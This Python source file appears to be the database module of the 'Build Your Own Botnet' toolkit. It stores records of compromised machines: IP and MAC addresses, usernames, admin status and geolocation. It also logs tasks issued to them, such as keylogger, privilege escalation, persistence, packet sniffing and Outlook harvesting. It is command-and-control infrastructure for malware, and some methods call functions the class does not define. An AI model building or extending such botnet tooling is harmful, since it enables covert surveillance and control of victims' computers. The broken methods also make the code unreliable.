#!/usr/bin/python
# -*- coding: utf-8 -*-
'Database (Build Your Own Botnet)'

# standard library
import os
import json
import hashlib
import datetime
import collections

# packages
from sqlalchemy import create_engine, Column, Integer, String, Boolean, DateTime, Float, Text
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

# modules
import util

try:
    unicode        # Python 2
except NameError:
    unicode = str  # Python 3

Base = declarative_base()

class Task(Base):
    __tablename__ = 'tbl_tasks'
    id = Column(Integer, primary_key=True)
    uid = Column(String(32), nullable=False)
    session = Column(String(32), nullable=False)
    task = Column(Text)
    result = Column(Text)
    issued = Column(DateTime)
    completed = Column(DateTime)

class Session(Base):
    __tablename__ = 'tbl_sessions'
    id = Column(Integer, primary_key=True)
    uid = Column(String(32), unique=True, nullable=False)
    online = Column(Boolean, default=False)
    joined = Column(DateTime)
    last_online = Column(DateTime, default=datetime.datetime.utcnow)
    sessions = Column(Integer, default=1)
    public_ip = Column(String(42))
    mac_address = Column(String(17))
    local_ip = Column(String(42))
    username = Column(String(32))
    administrator = Column(Boolean, default=False)
    platform = Column(String(5))
    device = Column(String(32))
    architecture = Column(String(2))
    latitude = Column(Float)
    longitude = Column(Float)
    owner = Column(String(120))

class Database:
    """
    Builds and manages a database for the
    sessions & tasks handled by byob.server.Server instances

    """
    def __init__(self, database_uri='sqlite:///byob.db'):
        """
        Create new database connection and setup the BYOB database

        `Optional`
        :param str database_uri:    database URI or file path

        """
        if not database_uri.startswith('sqlite://') and not database_uri.startswith('postgresql://'):
            database_uri = f'sqlite:///{database_uri}'
        self.engine = create_engine(database_uri, echo=False)
        Base.metadata.create_all(self.engine)
        self.Session = sessionmaker(bind=self.engine)
        self.session = self.Session()
        self._tasks = ['escalate','keylogger','outlook','packetsniffer','persistence','phone','portscan','process','screenshot']

    def _display(self, data, indent=4):
        c = globals().get('_color')

        if isinstance(data, dict):
            for k,v in data.items():
                if isinstance(v, unicode):
                    try:
                        j = json.loads(v.encode())
                        self._display(j, indent+2)
                    except:
                        util.display(str(k).ljust(4  * indent).center(5 * indent).encode(), color=c, style='bright', end=' ')
                        util.display(str(v).replace('\n',' ')[:40].encode(), color=c, style='dim')

                elif isinstance(v, list):
                    for i in v:
                        if isinstance(v, dict):
                            util.display(str(k).ljust(4  * indent).center(5 * indent).encode())
                            self._display(v, indent+2)
                        else:
                            util.display(str(i).ljust(4  * indent).center(5 * indent).encode())

                elif isinstance(v, dict):
                    util.display(str(k).ljust(4  * indent).center(5 * indent).encode())
                    self._display(v, indent+1)

                elif isinstance(v, int):
                    if v in (0,1):
                        util.display(str(k).ljust(4  * indent).center(5 * indent).encode(), color=c, style='bright', end=' ')
                        util.display(str(bool(v)).encode(), color=c, style='dim')
                    else:
                        util.display(str(k).ljust(4  * indent).center(5 * indent).encode(), color=c, style='bright', end=' ')
                        util.display(str(v).encode(), color=c, style='dim')

                else:
                    util.display(str(k).ljust(4  * indent).center(5 * indent).encode(), color=c, style='bright', end=' ')
                    util.display(str(v).encode(), color=c, style='dim')

        elif isinstance(data, list):
            for row in data:
                if isinstance(row, dict):
                    self._display(row, indent+2)
                else:
                    util.display(str(row).ljust(4  * indent).center(5 * indent).encode(), color=c, style='bright', end=' ')
                    util.display(str(v).encode(), color=c, style='dim')
        else:
            try:
                data = dict(data)
            except: pass

            if isinstance(data, collections.OrderedDict):
                data = dict(data)

            if isinstance(data, dict):
                self._display(data, indent+2)
            else:
                util.display(data.ljust(4  * indent).center(5 * indent).encode(), color=c, style='bright', end=' ')
                util.display(str(v).encode(), color=c, style='dim')

    def _client_sessions(self, uid):
        s = self.session.query(Session).filter_by(uid=uid).first()
        if s:
            return s.sessions + 1
        else:
            return 1

    def _count_sessions(self):
        return len(self.get_sessions(verbose=False))

    def debug(self, output):
        """
        Print debugging output to console
        """
        util.log(str(output), level='debug')

    def error(self, output):
        """
        Print error output to console
        """
        util.log(str(output), level='error')

    def exists(self, uid):
        """
        Check if a client exists in the database
        """
        return self.session.query(Session).filter_by(uid=uid).first() is not None

    def update_status(self, session, online):
        """
        Update session status to online/offline

        `Required`
        :param int session:     session ID
        :param bool online:     True/False = online/offline

        """
        try:
            if online:
                if isinstance(session, str):
                    s = self.session.query(Session).filter_by(uid=session).first()
                elif isinstance(session, int):
                    s = self.session.query(Session).filter_by(id=session).first()
                if s:
                    s.online = True
                    self.session.commit()
            else:
                if isinstance(session, str):
                    s = self.session.query(Session).filter_by(uid=session).first()
                elif isinstance(session, int):
                    s = self.session.query(Session).filter_by(id=session).first()
                if s:
                    s.online = False
                    s.last_online = datetime.datetime.utcnow()
                    self.session.commit()
        except Exception as e:
            self.error("{} error: {}".format(self.update_status.__name__, str(e)))

    def get_sessions(self, verbose=False):
        """
        Fetch sessions from database

        `Optional`
        :param bool verbose:    include full session information
        :param bool display:    display output

        """
        sessions = self.session.query(Session).all()
        if verbose:
            return [s.__dict__ for s in sessions]
        else:
            return [{'public_ip': s.public_ip, 'uid': s.uid, 'platform': s.platform} for s in sessions]

    def get_tasks(self):
        """
        Fetch tasks from database

        `Optional`
        :param int session:     session ID
        :param bool display:    display output

        Returns tasks as dictionary (JSON) object
        """
        tasks = self.session.query(Task).all()
        return [t.__dict__ for t in tasks]

    def handle_session(self, info):
        """
        Handle a new/current client by adding/updating database

        `Required`
        :param dict info:    session host machine information

        Returns the session information as a dictionary (JSON) object
        """
        if isinstance(info, dict):

            if not info.get('uid'):
                buid = str(info['public_ip'] + info['mac_address']).encode()
                info['uid'] = hashlib.md5(buid).hexdigest()
                info['joined'] = datetime.datetime.utcnow()

            info['online'] = True
            info['sessions'] = self._client_sessions(info['uid'])
            info['last_online'] = datetime.datetime.utcnow()

            newclient = False
            s = self.session.query(Session).filter_by(uid=info['uid']).first()
            if not s:
                newclient = True
                s = Session(
                    uid=info['uid'],
                    online=info['online'],
                    joined=info['joined'],
                    last_online=info['last_online'],
                    sessions=info['sessions'],
                    public_ip=info.get('public_ip'),
                    mac_address=info.get('mac_address'),
                    local_ip=info.get('local_ip'),
                    username=info.get('username'),
                    administrator=info.get('administrator', False),
                    platform=info.get('platform'),
                    device=info.get('device'),
                    architecture=info.get('architecture'),
                    latitude=info.get('latitude'),
                    longitude=info.get('longitude'),
                    owner=info.get('owner')
                )
                self.session.add(s)
            else:
                s.online = info['online']
                s.sessions = info['sessions']
                s.last_online = info['last_online']

            self.session.commit()

            info = s.__dict__
            if newclient:
                info['new'] = True

            return info

        else:
            self.error("Error: invalid input type received from server (expected '{}', receieved '{}')".format(dict, type(info)))

    def handle_task(self, task):
        """
        Adds issued tasks to the database and updates completed tasks with results

        `Task`
        :attr str client:          client ID assigned by server
        :attr str task:            task assigned by server
        :attr str uid:             task ID assigned by server
        :attr str result:          task result completed by client
        :attr datetime issued:     time task was issued by server
        :attr datetime completed:  time task was completed by client

        Returns task assigned by database as a dictionary (JSON) object

        """
        if isinstance(task, dict):
            if 'uid' not in task:
                buid = str(task['session'] + task['task'] + datetime.datetime.utcnow().ctime()).encode()
                task['uid'] = hashlib.md5(buid).hexdigest()
                task['issued'] = datetime.datetime.utcnow()
                t = Task(
                    uid=task['uid'],
                    session=task['session'],
                    task=task['task'],
                    issued=task['issued']
                )
                self.session.add(t)
                self.session.commit()
                task['issued'] = task['issued'].ctime()
            else:
                task['completed'] = datetime.datetime.utcnow()
                t = self.session.query(Task).filter_by(uid=task['uid']).first()
                if t:
                    t.result = task['result']
                    t.completed = task['completed']
                    self.session.commit()
                task['completed'] = task['completed'].ctime()

            return task

        else:
            self.debug("{} error: invalid input type (expected {}, received {})".format(self.handle_task.__name__, dict, type(task)))

    def execute_query(self, stmt, params={}, returns=True, display=False):
        """
        Query the database with a SQL statement and return result

        `Required`
        :param str sql:         SQL expression to query the database with

        `Optional`
        :param dict params:     dictionary of statement paramaters
        :param bool returns:    returns output if True
        :param bool display:    display output from database if True

        Returns a list of output rows formatted as dictionary (JSON) objects

        """
        result = []
        with self.engine.connect() as conn:
            res = conn.execute(stmt, params)
            for row in res:
                result.append(dict(row))
                if display:
                    self._display(dict(row))

        if returns:
            return result

    def execute_file(self, filename=None, sql=None, returns=True, display=False):
        """
        Execute SQL commands sequentially from a string or file

        `Optional`
        :param str filename:    name of the SQL batch file to execute
        :param bool returns:    returns output from database if True
        :param bool display:    display output from database if True

        Returns a list of output rows formatted as dictionary (JSON) objects

        """
        try:
            result = []
            if isinstance(filename, str):
                assert os.path.isfile(filename), "keyword argument 'filename' must be a valid filename"

                with open(filename) as stmts:
                    for line in self.executescript(stmts.read()):
                        result.append(line)
                        if display:
                            self._display(line)

            elif isinstance(sql, str):
                for line in self.executescript(sql):
                    result.append(line)
                    if display:
                        self._display(line)

            else:
                raise Exception("missing required keyword argument 'filename' or 'sql'")

            self.commit()

            if returns:
                return result

        except Exception as e:
            self.error("{} error: {}".format(self.execute_file.__name__, str(e)))